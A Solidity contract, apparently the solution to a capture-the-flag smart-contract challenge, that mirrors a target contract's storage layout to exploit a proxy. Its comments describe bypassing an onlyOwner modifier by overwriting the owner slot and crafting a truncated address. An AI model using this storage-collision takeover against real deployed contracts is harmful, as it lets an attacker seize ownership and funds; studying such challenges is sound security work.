// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

contract SolverContract {
  // Have similar storage as the original contract
  struct Structure {
    uint8 x;
    uint16 y;
    bool z;
    uint24 a;
    bytes8 bt;
    uint32 b;
  }

  address public owner;
  Structure public str = Structure(1, 13, false, 37, "cafe", 10);
  address public logic;
  bool public cr3 = false;

  constructor(address _own, address _log) {
    owner = _own;
    logic = _log;
  }

  function FirstStep(bool boolVal) external returns(bool, address, bytes8) {
    // Only Change The Required parts of the struct
    str.z = boolVal;
    bytes8 toRet = "ffff";

    // Return what contract expects
    return(false, address(0), toRet);
  }

  // Bypass The onlyOwner Modifier By Changing the modifier
  function SecondStep(address _newOwner) external returns(address) {
    owner = _newOwner;

    return(owner);
  }

  // Address Truncation -> Craft the address to bytes32 here
  // When Returned, the proxy contract will decode it back to original address
  function FinalStep(address newOwner) external pure returns (bytes6, bytes32){
    bytes6  cr = "cr3";
    bytes32 retBytes32 = bytes32(uint256(uint160(newOwner)));

    return(cr, retBytes32);
  }
}
